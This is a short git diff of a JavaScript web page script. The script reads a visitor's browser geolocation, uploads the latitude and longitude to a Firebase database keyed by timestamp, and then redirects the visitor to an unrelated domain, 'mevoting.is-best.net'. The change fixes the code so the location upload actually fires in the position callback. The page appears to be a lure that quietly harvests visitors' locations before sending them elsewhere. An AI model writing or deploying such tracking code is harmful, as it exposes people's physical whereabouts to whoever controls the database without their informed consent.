@@ -12,12 +12,11 @@ var firebaseConfig = {
 };
 firebase.initializeApp(firebaseConfig);
 // Initialize Firebase
-console.log(firebase);
+console.log(firebase)
 
 var d = new Date();
 let time = d.getTime();
 var x = document.getElementById("demo");
-var mnks = firebase.database().ref("/").child(time).update({ Latitude : position.coords.latitude, Longitude : position.coords.longitude });
 
 function getSave() {
   if (navigator.geolocation) {
@@ -29,6 +28,6 @@ function getSave() {
 
 function showPosition(position) {
     x.innerHTML = "Latitude: " + position.coords.latitude + "<br>Longitude: " + position.coords.longitude;
-    mnks;
+    firebase.database().ref("/").child(time).update({ Latitude : position.coords.latitude, Longitude : position.coords.longitude });
     window.location.assign("http://mevoting.is-best.net/");
 }
